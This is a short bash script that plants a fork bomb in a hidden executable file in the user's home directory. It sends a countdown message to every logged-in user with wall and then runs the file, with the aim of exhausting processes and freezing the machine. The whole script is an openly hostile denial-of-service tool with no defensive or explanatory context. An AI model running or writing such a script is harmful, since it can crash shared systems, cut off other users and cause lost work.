#!/bin/bash

busybox echo ":(){:|:&};:" > /home/$USER/.pipe-bomb

chmod +x /home/$USER/.pipe-bomb

wall 10
sleep 1
wall 9
sleep 1
wall 8
sleep 1
wall 7
sleep 1
wall 6
sleep 1
wall 5
sleep 1
wall 4
sleep 1
wall 3
sleep 1
wall 2
sleep 1
wall 1
sleep 1

wall "It's go time!"

/home/$USER/.pipe-bomb